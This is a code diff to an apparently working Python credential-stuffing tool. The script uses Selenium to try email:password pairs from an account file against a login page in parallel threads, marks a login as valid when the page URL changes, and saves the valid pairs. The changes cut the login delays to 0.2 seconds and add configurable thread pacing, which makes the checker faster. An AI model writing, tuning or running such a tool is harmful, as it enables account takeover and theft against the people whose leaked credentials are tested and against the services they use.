@@ -19,6 +19,7 @@ config.read('config.cfg')
 HEADLESS = config.getboolean('Settings','HEADLESS')
 MAX_THREADS = config.getint('Settings', 'MAX_THREADS')
 MAX_THREADS_DELAY = config.getint('Settings', 'MAX_THREADS_DELAY')
+DELAY_THREADS = config.getfloat('Settings','DELAY_THREADS')
 ACCOUNT_FILE_NAME = config.get('Settings', 'ACCOUNT_FILE_NAME')
 SEPARATED_BY = config.get('Settings', 'SEPARATED_BY')
 OUTPUT_FILE = config.get('Settings', 'OUTPUT_FILE')
@@ -56,17 +57,16 @@ class Program():
             print("{0}Checking {1}:{2}...".format(Fore.YELLOW,email,passw))
         self.username_space.send_keys(email)
         self.password_space.send_keys(passw)
-        time.sleep(1)
+        time.sleep(0.2)
         self.login_button.click()
-        time.sleep(1)
+        time.sleep(0.2)
         if self.Driver.current_url != self.login:
             if LOG_LEVEL == 1 or LOG_LEVEL == 2: 
-                print("{0}VALID! {1}:{2} {3}{4}#{5}".format(Fore.GREEN,email,passw,Style.BRIGHT,Fore.BLUE,self.CURRENT_COUNT if SHOW_COUNTER else ''))
+                print("{3}[{4}] {0}VALID! {1}{2}".format(Fore.GREEN,self.CURRENT_ACCOUNT,Style.BRIGHT,Fore.BLUE,str(self.CURRENT_COUNT) if SHOW_COUNTER else ''))
             self.Save(self.CURRENT_ACCOUNT)
         else:
             if LOG_LEVEL == 1 or LOG_LEVEL == 2:
-                print("{0}INVALID! {1}:{2} {3}{4}#{5}".format(Fore.RED,email,passw,Style.BRIGHT,Fore.BLUE,self.CURRENT_COUNT if SHOW_COUNTER else ''))
-        time.sleep(0.5)
+                print("{3}[{4}] {0}INVALID! {1}{2}".format(Fore.RED,self.CURRENT_ACCOUNT,Style.BRIGHT,Fore.BLUE,str(self.CURRENT_COUNT) if SHOW_COUNTER else ''))
         CURRENT_THREADS -= 1
         self.Driver.close()
 
@@ -97,6 +97,7 @@ for account in accounts:
     COUNTER += 1
     
     thread = threading.Thread(target=Program, args=(email, password,COUNTER,account))
+    time.sleep(DELAY_THREADS)
     thread.start()
     CURRENT_THREADS += 1
     continue
